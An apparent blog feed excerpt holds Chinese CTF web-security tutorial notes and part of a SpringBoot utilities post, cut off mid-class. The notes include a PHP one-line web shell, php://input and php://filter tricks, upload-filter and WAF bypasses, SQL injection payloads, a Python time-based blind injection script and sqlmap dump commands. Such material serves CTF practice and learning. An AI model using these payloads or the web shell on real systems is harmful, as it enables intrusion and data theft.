    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>各种姿势<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h3><ol><li>$_SERVER[‘QUERY_STRING’]会获取到所有的文件后面传递的所有参数</li><li>php自身在解析请求时，会把+和.解析成下划线</li><li>数组与数字比较，永远大于数字</li><li>字符a在和整形进行弱类型比较时，会被强制转换成整形，其值为0<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4></li></ol><blockquote><p>file:// — 访问本地文件系统<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br>php:// — 访问各个输入/输出流（I/O streams）<br>zlib:// — 压缩流<br>data:// — 数据（RFC 2397）<br>glob:// — 查找匹配的文件路径模式<br>phar:// — PHP 归档<br>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p></blockquote><h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><ol><li>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.</li><li>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。</li><li>用于直接读取用户的根目录的东西<blockquote><p>url=php://filter/read=convert.base64-encode/resource=flag</p></blockquote><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5></li><li>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<blockquote><p>使用时令参数赋值 php://input<br>利用hackbar使用post 传递命令 &lt;?php system(‘ls’)?&gt;  （列举所有文件）</p></blockquote></li></ol><h3 id="服务器自身漏洞"><a href="#服务器自身漏洞" class="headerlink" title="服务器自身漏洞"></a>服务器自身漏洞</h3><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><ol><li>上传点存在白名单验证，从返回包可以得知其是apache2.2.15，apache2.2.15版本具有文件解析漏洞，可以把test.php.png当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用apache2.2.15的解析漏洞来绕过白名单限制<blockquote><p>&lt;?php system($_POST[‘cmd’]); ?&gt;<br>之后再利用post 发送数据，  cmd = cat /flag  获取flag</p></blockquote></li></ol><h3 id="xss-漏洞"><a href="#xss-漏洞" class="headerlink" title="xss 漏洞"></a>xss 漏洞</h3><h4 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a>xss介绍</h4><p>是由于动态网页的Web应用对用户提交请求参数未做充分的检查过滤，允许用户在提交的数据中掺入HTML代码（最主要的是“&gt;”、“&lt;”），然后未加编码地输出到第三方用户的浏览器，这些攻击者恶意提交代码会被受害用户的浏览器解释执行</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>到 文件里改就完事了  </p><blockquote><p> c:\windows\system32\drivers\etc\hosts<br>前面是ip 后面是域名</p></blockquote><h3 id="php九大内置变量"><a href="#php九大内置变量" class="headerlink" title="php九大内置变量"></a>php九大内置变量</h3><p>分析php的9大内置变量</p><blockquote><p>$_POST [用于接收post提交的数据]<br>$_GET [用于获取url地址栏的参数数据]<br>$_FILES [用于文件就收的处理img 最常见]<br>$_COOKIE [用于获取与setCookie()中的name 值]<br>$_SESSION [用于存储session的值或获取session中的值]<br>$_REQUEST [具有get,post的功能，但比较慢]<br>$SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都<br>$GLOBALS [一个包含了所有全局变量的数组]<br>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p></blockquote><h3 id="http系列"><a href="#http系列" class="headerlink" title="http系列"></a>http系列</h3><h4 id="referer-你从哪里来"><a href="#referer-你从哪里来" class="headerlink" title="referer (你从哪里来)"></a>referer (你从哪里来)</h4><blockquote><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，<br>告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。<br>简而言之，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，<br>一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。<br>比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。</p></blockquote><h3 id="绕过问题"><a href="#绕过问题" class="headerlink" title="绕过问题"></a>绕过问题</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><ol><li>随便把content-type的内容进行大小写更改<blockquote><p>Content-Type: mULtipart/form-data;  boundary=—————————4827543632391   #修改大小写绕过 </p></blockquote></li><li>然后黄爆爆破尾缀<blockquote><p>改成php+数字的格式，比如php1，php2啥的</p></blockquote></li><li>靶机<br><a href="http://123.206.87.240:8002/web9/" target="_blank" rel="noopener">http://123.206.87.240:8002/web9/</a></li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;各种姿势&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf攻防之sql注入</title>
    <link href="http://runindark.com/2019/10/15/CTF-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://runindark.com/2019/10/15/CTF-SQL注入/</id>
    <published>2019-10-15T03:38:49.374Z</published>
    <updated>2019-11-08T09:04:48.529Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>基础sql注入<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="sql注入的基本原理"><a href="#sql注入的基本原理" class="headerlink" title="sql注入的基本原理"></a>sql注入的基本原理</h4><ol><li>sql注入的主要原因来自sql查询的字符串拼接，例如我们正常输入1，那么呈现</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure><ol start="2"><li>但是如果进行心机输入 1’ ,那么将会变成 ==》</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1''</span></span><br></pre></td></tr></table></figure><ol start="3"><li>继续下去，因为两个 ‘ 的原因，那么则会产生sql syntax error ,所以需要产生注释后面的内容，我们需要#，因此输入 1’#</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span><span class="comment">#' </span></span><br><span class="line"></span><br><span class="line">===============&gt; 明显一些</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure><ol start="4"><li>注入分类<br>整形注入<blockquote><p>SELECT * FROM admin WHERE id = 1 and 1=1</p></blockquote></li></ol><p>字符型注入</p><blockquote><p>SELECT * FROM admin WHERE id = ‘1’ and 1=1#’</p></blockquote><p>搜索型注入</p><blockquote><p>SELECT * FROM admin WHERE id LIKE ‘%1%’ and ‘%’=’%’</p></blockquote><h4 id="sql注入常用基本操作————主要利用union-select联合查询继续获取信息"><a href="#sql注入常用基本操作————主要利用union-select联合查询继续获取信息" class="headerlink" title="sql注入常用基本操作————主要利用union select联合查询继续获取信息"></a>sql注入常用基本操作————主要利用union select联合查询继续获取信息</h4><ol><li>获取数据库的基础信息<blockquote><p>1’ union select database(),user()#<br>database()返回当前使用的数据库名称<br>user() 返回当前使用者的信息</p></blockquote></li><li>获取操作系统等功能<blockquote><p>1’ union select version(),@@version_compile_os#<br>version() 获取当前数据库版本<br>@@version_compile_os 获取当前操作系统@@version_compile_os 获取当前操作系统</p></blockquote></li><li>获取数据库的表名<blockquote><p>1’ union select table_names,table_schema from information_schema.tables where table_schema = ‘table name’ #<br>数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库<br>ps: 数据库会用一个information_schema.tables来记录表的信息</p></blockquote></li><li>获取数据库的列名<blockquote><p>1’ union select group_concat(column_name) from information_schema.columns where table_schema=database()</p></blockquote></li><li>内联注释绕过<blockquote><p>上述union select 可能会被拦截，因此使用注释绕过，用/<em>！XX </em>/ 包裹，来实现绕过<br>word=1%’ and 1=2 /<em>!union</em>/   /<em>!select</em>/ database(),user(),database() %23&amp;§number=5§<br>转自： <a href="https://www.cnblogs.com/baimaoma/p/8608490.html" target="_blank" rel="noopener">https://www.cnblogs.com/baimaoma/p/8608490.html</a></p></blockquote></li></ol><h4 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h4><p>简单的来说，就是在sql中会因为一些空格来进行绕过，以账号密码注册为例子</p><ol><li>默认后台有admin/password01</li><li>我们注册时候使用admin         /password02</li><li>登陆的时候用admin/password02就可以正常的登陆</li><li>原因说明：<blockquote><p>其实入库的时候会自动减去注册时尾部的空格，但是代码在写的时候却没有去掉空格，所以加上空格之后就不会查重，但是入了库就又重复了</p></blockquote></li></ol><h4 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h4><p>最简单的注入在于，无论你去注入什么，或者搜索或者选择都是会有相应的显示的，但是还有一部分的盲注是没有提示的，你无法得知自己是否sql注入成功，所以插入sql中的sleep（），get_lock()等系列函数，通过时间延迟来判断是否注入成功，以为盲注全靠猜，因此需要脚本来实现盲注 。</p><h4 id="盲注分类"><a href="#盲注分类" class="headerlink" title="盲注分类"></a>盲注分类</h4><p>Time盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE id = 1 AND (SELECTif((SELECT substr(table_name,1,1)  FROM users  limit 0,1)=&apos;e&apos;,sleep(10),null))</span><br></pre></td></tr></table></figure></p><p>•Bool盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE id = 1 and  ascii(substr((SELECT  database()),1,1))&gt;99</span><br></pre></td></tr></table></figure></p><h5 id="ctf盲注代码："><a href="#ctf盲注代码：" class="headerlink" title="ctf盲注代码："></a>ctf盲注代码：</h5><p>靶机： <a href="http://114.55.36.69:8007/" target="_blank" rel="noopener">http://114.55.36.69:8007/</a><br>注入猜测： <a href="http://114.55.36.69:8007/article.php?id=1&#39;" target="_blank" rel="noopener">http://114.55.36.69:8007/article.php?id=1&#39;</a> and sleep(5) %23<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">data = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://114.55.36.69:8007/article.php?id=1'"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">47</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        url_req = url + <span class="string">" and if(ascii(substr((content),&#123;0&#125;,1))=&#123;1&#125;,get_lock('test',3),1)%23"</span>.format(i+<span class="number">1</span>,str(c)) <span class="comment"># 盲注猜测</span></span><br><span class="line">        print(url_req)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.get(url_req) <span class="comment"># 请求</span></span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">2.5</span>: <span class="comment"># 时间超过3秒说明注入成功，计入data</span></span><br><span class="line">            data += chr(c)</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">print(<span class="string">'data:'</span>,data) <span class="comment"># 输出结果</span></span><br></pre></td></tr></table></figure></p><blockquote><p>大佬帖子： <a href="https://www.cesafe.com/3993.html" target="_blank" rel="noopener">https://www.cesafe.com/3993.html</a> </p></blockquote><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>感受了一哈，牛逼嗷</p><h5 id="sqlmap-post"><a href="#sqlmap-post" class="headerlink" title="sqlmap-post"></a>sqlmap-post</h5><p>post的特殊一些，所有会把用burpsuite导出一份txt文件用于进行注入</p><ol><li>判断是什么注入类型，是什么类型的数据库<blockquote><p>python sqlmap.py -r test\post.txt</p></blockquote></li><li>通过加后缀 –dbs 可以看到数据库的版本等更多信息<blockquote><p>python sqlmap.py -r test\post.txt –dbs</p></blockquote></li><li>通过后缀 -D 指定具体数据库， 利用后缀 –table 可以看到具体数据库的具体表名<blockquote><p>python sqlmap.py -r test\post.txt -D skctf_flag –tables</p></blockquote></li><li>通过后缀 -T 进一步指定某表的具体的列名<blockquote><p>python sqlmap.py -r test\post.txt -D skctf_flag -T fl4g –columns</p></blockquote></li><li>通过后缀 -C 具体指定具体的一列 <blockquote><p>python sqlmap.py -r test\post.txt -D skctf_flag -T fl4g -C “skctf_flag” –dump</p></blockquote></li><li>通过后缀 –search 查找字段<blockquote><p>python sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</p></blockquote></li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;基础sql注入&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SpringBoot 一些常用配置【持续更新】</title>
    <link href="http://runindark.com/2019/08/07/Springboot%E5%90%84%E7%B1%BB%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://runindark.com/2019/08/07/Springboot各类常用配置/</id>
    <published>2019-08-07T07:49:32.843Z</published>
    <updated>2019-08-07T07:57:57.562Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>Springboot 一些常用配置</excerpt></p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h2><h3 id="ID生成器"><a href="#ID生成器" class="headerlink" title="ID生成器"></a>ID生成器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.Data;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 各类id生成工具</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IdUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成用户ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Uid</span> <span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String uid = <span class="string">"U"</span> + UUID.randomUUID().toString().hashCode();</span><br><span class="line">        <span class="keyword">return</span> uid  ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成商家ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Bid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String bid = <span class="string">"B"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> bid  ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成商品ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Gid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String gid = <span class="string">"G"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> gid  ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成订单ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Olid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> hashCodeV = UUID.randomUUID().toString().hashCode();</span><br><span class="line">        <span class="keyword">if</span> (hashCodeV &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            hashCodeV = - hashCodeV ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>   <span class="string">"OL"</span>+ hashCodeV;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成红包ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Cid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String cid = <span class="string">"C"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> cid  ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成轮播图ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Sid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String sid = <span class="string">"S"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> sid ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成主界面小图标ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Hid</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String hid = <span class="string">"H"</span> + UUID.randomUUID().toString().hashCode() ;</span><br><span class="line">        <span class="keyword">return</span> hid ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成二维码小图标</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">Qrid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCodeV = UUID.randomUUID().toString().hashCode();</span><br><span class="line">        <span class="keyword">if</span> (hashCodeV &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            hashCodeV = - hashCodeV ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>   <span class="string">"OR"</span>+ hashCodeV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图片处理器（只留下图片名）"><a href="#图片处理器（只留下图片名）" class="headerlink" title="图片处理器（只留下图片名）"></a>图片处理器（只留下图片名）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PicUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">CutPicStr</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        File file = <span class="keyword">new</span> File(str);</span><br><span class="line">        File[] fs = file.listFiles();</span><br><span class="line">        List&lt;String&gt; paths = <span class="keyword">new</span> ArrayList&lt;&gt;() ;</span><br><span class="line">        <span class="keyword">for</span>(File f:fs)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!f.isDirectory()) &#123;</span><br><span class="line"></span><br><span class="line">                paths.add(f.getName()) ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  paths;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="时间格式化器"><a href="#时间格式化器" class="headerlink" title="时间格式化器"></a>时间格式化器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String  <span class="title">getTime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Calendar calendar = Calendar.getInstance();</span><br><span class="line">        Date date = calendar.getTime() ;</span><br><span class="line">        SimpleDateFormat sdf =<span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span> );</span><br><span class="line">        String s = sdf.format(date) ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getTime</span><span class="params">(Date date)</span></span>&#123;</span><br><span class="line">        SimpleDateFormat sdf =<span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span> );</span><br><span class="line">        String s = sdf.format(date) ;</span><br><span class="line">        <span class="keyword">return</span>  s ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二维码生成器"><a href="#二维码生成器" class="headerlink" title="二维码生成器"></a>二维码生成器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.service.QR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 二维码生成服务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QRService</span> 